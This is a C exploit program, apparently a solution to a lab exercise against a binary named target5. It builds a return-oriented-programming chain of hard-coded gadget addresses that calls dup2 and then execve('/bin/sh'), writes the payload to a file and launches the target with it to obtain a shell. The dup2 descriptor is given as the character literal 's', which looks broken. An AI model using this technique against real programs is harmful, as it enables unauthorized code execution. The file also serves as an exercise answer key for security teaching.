#include <string.h>
#include <unistd.h>
#include "shellcode.h"
#include "write_xploit.h"

#define TARGET "/tmp/target5"
#define DEFAULT_OUTPUT "/tmp/xploit5_output"

#define ADDR_SYSCALL_RET 0x4d8265
#define ADDR_POP_RAX_RET 0x4d84d1
#define ADDR_POP_RDI_RET 0x4d74e0
#define ADDR_POP_RDX_RET 0x485d4b
#define ADDR_POP_RSI_RET 0x4d5148

#define ADDR_BIN_SH 0x4d9000

int main(int argc, char *argv[])
{
  char exploit[448];
  char * exploit_pointer = exploit;

  // Fill exploit buffer by using ROP
  memset(exploit, 0, sizeof(exploit));
  exploit_pointer += 264;

  // dup2(s, 0): 56
  *(size_t *)(exploit_pointer) = ADDR_POP_RDI_RET; exploit_pointer += 8;
  *(size_t *)(exploit_pointer) = 's'; exploit_pointer += 8;
  *(size_t *)(exploit_pointer) = ADDR_POP_RSI_RET; exploit_pointer += 8;
  *(size_t *)(exploit_pointer) = 0; exploit_pointer += 8;
  *(size_t *)(exploit_pointer) = ADDR_POP_RAX_RET; exploit_pointer += 8;
  *(size_t *)(exploit_pointer) = 33; exploit_pointer += 8;
  *(size_t *)(exploit_pointer) = ADDR_SYSCALL_RET; exploit_pointer += 8;

  *(size_t *)(exploit_pointer) = ADDR_POP_RDI_RET; exploit_pointer += 8;
  *(size_t *)(exploit_pointer) = 's'; exploit_pointer += 8;
  *(size_t *)(exploit_pointer) = ADDR_POP_RSI_RET; exploit_pointer += 8;
  *(size_t *)(exploit_pointer) = 1; exploit_pointer += 8;
  *(size_t *)(exploit_pointer) = ADDR_POP_RAX_RET; exploit_pointer += 8;
  *(size_t *)(exploit_pointer) = 33; exploit_pointer += 8;
  *(size_t *)(exploit_pointer) = ADDR_SYSCALL_RET; exploit_pointer += 8;

  *(size_t *)(exploit_pointer) = ADDR_POP_RDI_RET; exploit_pointer += 8;
  *(size_t *)(exploit_pointer) = ADDR_BIN_SH; exploit_pointer += 8;
  *(size_t *)(exploit_pointer) = ADDR_POP_RSI_RET; exploit_pointer += 8;
  *(size_t *)(exploit_pointer) = 0; exploit_pointer += 8;
  *(size_t *)(exploit_pointer) = ADDR_POP_RDX_RET; exploit_pointer += 8;
  *(size_t *)(exploit_pointer) = 0; exploit_pointer += 8;
  *(size_t *)(exploit_pointer) = ADDR_POP_RAX_RET; exploit_pointer += 8;
  *(size_t *)(exploit_pointer) = 59; exploit_pointer += 8;
  *(size_t *)(exploit_pointer) = ADDR_SYSCALL_RET;

  // Write the exploit buffer to a file
  write_xploit(exploit, sizeof(exploit), DEFAULT_OUTPUT);

  char *args[] = { TARGET, DEFAULT_OUTPUT, NULL };
  char *env[] = { NULL };
  execve(TARGET, args, env);
  perror("execve failed");

  return 0;
}
